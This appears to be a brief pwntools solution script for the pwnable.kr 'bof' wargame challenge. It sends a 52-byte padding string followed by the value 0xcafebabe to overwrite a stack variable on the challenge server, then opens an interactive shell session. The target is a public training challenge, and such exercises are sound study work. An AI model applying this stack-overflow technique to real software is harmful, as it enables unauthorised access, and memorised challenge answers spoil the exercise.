from pwn import *

local = False

if local:
	r = process('./bof')
	pause()
	r.recvuntil(': ')
else:
	r = remote('pwnable.kr', 9000)

r.sendline("A"*52+"\xBE\xBA\xFE\xCA\x00")
r.interactive()
